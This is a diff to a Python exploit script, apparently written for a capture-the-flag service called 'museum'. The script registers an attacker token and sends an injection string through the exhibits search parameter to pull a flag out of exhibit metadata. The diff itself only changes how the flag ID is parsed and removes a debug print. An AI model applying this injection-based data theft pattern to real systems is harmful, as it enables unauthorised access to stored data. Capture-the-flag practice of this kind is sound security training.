@@ -2,6 +2,7 @@
 
 import sys
 import requests
+import json
 
 IP = sys.argv[1] if len(sys.argv) > 1 else "localhost"
 PORT = 6969
@@ -10,7 +11,8 @@ PUBLIC_FLAG_ID = sys.argv[2] if len(sys.argv[2]) > 2 else ""
 
 def main():
     api_url = f"http://{IP}:{PORT}"
-    museum_id, exhibit_id = PUBLIC_FLAG_ID.split(":")
+    public_flag_id = json.loads(PUBLIC_FLAG_ID)
+    museum_id, exhibit_id = public_flag_id["museum_id"], public_flag_id["exhibit_id"]
 
     hacker_token = requests.post(
         f"{api_url}/register",
@@ -24,7 +26,6 @@ def main():
         f"{api_url}/museum/exhibits?search={injection_search}",
         headers={"token": hacker_token},
     ).json()
-    print(resp)
     print(resp["exhibits"][0]["metadata"])
 
 
